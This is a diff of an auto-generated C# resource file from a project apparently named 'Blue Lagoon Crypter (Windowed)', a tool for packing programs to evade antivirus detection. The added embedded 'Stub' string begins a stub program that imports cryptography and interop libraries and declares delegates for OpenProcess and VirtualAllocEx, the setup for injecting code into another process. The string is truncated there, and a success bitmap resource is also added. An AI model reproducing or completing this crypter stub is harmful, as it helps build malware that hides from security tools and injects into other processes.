@@ -62,18 +62,36 @@ namespace Blue_Lagoon_Crypter__Windowed_.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to using System;
+        ///using System.IO;
+        ///using System.Runtime.InteropServices;
+        ///using System.Security.Cryptography;
+        ///using System.Text;
         ///
-        ///namespace Blue_Lagoon_Crypter_(Windowed).Resources
+        ///namespace Stub
         ///{
-        ///	class Stub
-        ///	{
-        ///		
-        ///	}
-        ///}.
+        ///    internal static class Program
+        ///    {
+        ///        #region Delegates
+        ///        // ProcessOpen
+        ///        private delegate IntPtr ProcOpen(uint processAccess, bool bInheritHandle, int processId);
+        ///        
+        ///        // VirtualAllocEx
+        ///        private delegate IntPtr AllocateMem(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint fLProtect);
+        /// [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
                 return ResourceManager.GetString("Stub", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap Success {
+            get {
+                object obj = ResourceManager.GetObject("Success", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
             }
         }
     }
